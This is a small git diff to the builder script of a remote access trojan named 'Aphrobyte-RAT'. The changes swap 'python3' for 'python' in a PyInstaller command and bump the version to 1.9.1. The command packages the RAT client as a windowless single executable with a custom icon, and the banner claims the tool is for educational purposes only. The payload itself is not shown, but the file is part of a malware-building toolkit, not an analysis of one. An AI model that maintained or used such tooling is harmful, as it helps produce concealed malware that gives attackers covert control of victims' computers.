@@ -29,7 +29,7 @@ class Builder:
         f.close()
     def build(self):
         os.system("""
-python3 -m PyInstaller --onefile --noconsole --name="Client-built" --icon=".buildmodules\exeic.ico" ".buildmodules\main.py"
+python -m PyInstaller --onefile --noconsole --name="Client-built" --icon=".buildmodules\exeic.ico" ".buildmodules\main.py"
 """)
 
 
@@ -50,7 +50,7 @@ ascii_art = """
 ╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░░░░╚═╝░░░╚══════╝
 
 This tool has been made for educational purposes only. I am not responsible for any misuse of this tool.
-Made by RIOT Administration | v1.9
+Made by RIOT Administration | v1.9.1
 """ 
 clear()
 os.system("""title "Aphrobyte-RAT Builder | Warning | Unlicensed"
